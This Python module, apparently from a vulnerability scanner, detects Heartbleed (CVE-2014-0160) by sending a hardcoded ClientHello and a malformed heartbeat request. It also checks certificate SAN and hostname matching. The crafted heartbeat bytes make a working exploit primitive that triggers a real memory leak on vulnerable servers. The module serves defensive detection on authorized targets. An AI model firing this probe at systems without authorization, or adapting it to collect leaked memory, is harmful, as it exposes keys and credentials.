"""Batch I — Heartbleed (CVE-2014-0160) deterministic probe. Sends a TLS
ClientHello advertising the heartbeat extension, then a malformed heartbeat
request, and checks whether the server returns a heartbeat response longer than
the (tiny) payload we sent — the canonical, library-free detection.

READ-ONLY and self-limiting: we request the minimum and discard whatever leaks.
Used only against authorized targets. Graceful on any error.

The cert-hygiene checks (expiry/self-signed/weak-cipher/weak-key/legacy-protocol)
live in service_probes._check_tls; this module is the CVE-specific TLS layer.
"""

from __future__ import annotations

import socket
import struct

from kryon.cli.engage import DiscoveredService, Finding
from kryon.cli.service_probes import _f

_T = 5.0

# TLS 1.1 ClientHello with the heartbeat extension (000f 0001 01) at the end.
# Public-domain layout (Jared Stafford's ssltest.py). 225 bytes (5 header + 220).
_HELLO = bytes.fromhex(
    "16 03 02 00 dc 01 00 00 d8 03 02 53"
    "43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf"
    "bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00"
    "00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88"
    "00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c"
    "c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09"
    "c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44"
    "c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c"
    "c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11"
    "00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04"
    "03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19"
    "00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08"
    "00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13"
    "00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00"
    "00 0f 00 01 01".replace(" ", "")
)
# Heartbeat request: type 24, TLS 1.1, len 3, HB request, claimed payload length 0x4000.
_HEARTBEAT = bytes.fromhex("1803020003014000")


def _recv_all(s: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        try:
            chunk = s.recv(n - len(buf))
        except (TimeoutError, OSError):
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


def _recv_tls_record(s: socket.socket) -> tuple[int, bytes] | None:
    """Read one TLS record; return (content_type, payload) or None."""
    hdr = _recv_all(s, 5)
    if hdr is None:
        return None
    content_type, _ver, length = struct.unpack(">BHH", hdr)
    if length == 0 or length > 70000:
        return content_type, b""
    payload = _recv_all(s, length)
    if payload is None:
        return None
    return content_type, payload


def _check_heartbleed(svc: DiscoveredService) -> Finding | None:
    try:
        with socket.create_connection((svc.host, svc.port), timeout=_T) as s:
            s.settimeout(_T)
            s.sendall(_HELLO)
            # Drain handshake records until ServerHelloDone (handshake type 14) or alert.
            saw_server_hello = False
            for _ in range(8):
                rec = _recv_tls_record(s)
                if rec is None:
                    return None
                ctype, payload = rec
                if ctype == 22:  # handshake
                    saw_server_hello = True
                    if payload and payload[0] == 0x0E:  # ServerHelloDone
                        break
                elif ctype == 21:  # alert during handshake → not TLS-as-expected
                    return None
            if not saw_server_hello:
                return None
            s.sendall(_HEARTBEAT)
            rec = _recv_tls_record(s)
            if rec is None:
                return None
            ctype, payload = rec
            # A heartbeat response (type 24) longer than our 1-byte payload = memory leak.
            if ctype == 24 and len(payload) > 3:
                return _f(
                    svc, "CWE-126", "CRITICAL", "tls-heartbleed",
                    f"Heartbleed (CVE-2014-0160) en {svc.host}:{svc.port} — fuga de memoria del proceso TLS.",
                    f"El server devolvió {len(payload)} bytes de heartbeat ante un payload de 1 byte (memoria filtrada)",
                    "Actualizar OpenSSL (≥ 1.0.1g); revocar y reemitir certificados/llaves; rotar credenciales.",
                )
            # type 21 (alert) here = patched (rejects the malformed heartbeat) → no finding.
    except (TimeoutError, OSError, ValueError):
        return None
    return None


def _host_matches_san(host: str, names: list[str]) -> bool:
    host = host.lower().rstrip(".")
    for n in names:
        n = n.lower().rstrip(".")
        if n == host:
            return True
        if n.startswith("*.") and "." in host and host.split(".", 1)[1] == n[2:]:
            return True
    return False


def _check_cert_validation(svc: DiscoveredService) -> list[Finding]:
    """Certificate without a SAN extension, or whose SAN/CN doesn't cover the
    target hostname (skipped for IP literals — SNI/hostname don't apply)."""
    import ipaddress  # noqa: PLC0415

    from kryon.cli.probe_base import peer_cert  # noqa: PLC0415

    try:
        ipaddress.ip_address(svc.host)
        return []  # IP target → no hostname to validate
    except ValueError:
        pass
    pc = peer_cert(svc.host, svc.port, _T)
    der = pc[0] if pc else None
    if not der:
        return []
    out: list[Finding] = []
    try:
        from cryptography import x509  # noqa: PLC0415
        from cryptography.x509.oid import ExtensionOID  # noqa: PLC0415

        cert = x509.load_der_x509_certificate(der)
        try:
            san = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
            names = san.value.get_values_for_type(x509.DNSName)
        except x509.ExtensionNotFound:
            names = []
            out.append(_f(svc, "CWE-295", "LOW", "tls-cert-no-san",
                f"Certificado TLS sin extensión SubjectAlternativeName en {svc.host}:{svc.port} (solo CN, deprecado).",
                "El certificado no tiene SAN; los navegadores modernos lo rechazan",
                "Reemitir el certificado con SAN (los clientes ignoran el CN desde 2017)."))
        if names and not _host_matches_san(svc.host, names):
            out.append(_f(svc, "CWE-297", "MEDIUM", "tls-cert-hostname-mismatch",
                f"Certificado TLS no cubre el hostname {svc.host} en {svc.host}:{svc.port}.",
                f"SAN={','.join(names[:5])} no incluye {svc.host}",
                "Emitir el certificado para el hostname correcto (o agregar el SAN faltante)."))
    except Exception:  # noqa: BLE001 — cert parse best-effort
        pass
    return out


def run_tls_probes(svc: DiscoveredService) -> list[Finding]:
    """CVE-specific TLS probes (Heartbleed) + cert hostname/SAN validation. Never raises."""
    out: list[Finding] = []
    try:
        f = _check_heartbleed(svc)
        if f:
            out.append(f)
    except Exception:  # noqa: BLE001
        pass
    try:
        out.extend(_check_cert_validation(svc))
    except Exception:  # noqa: BLE001
        pass
    return out
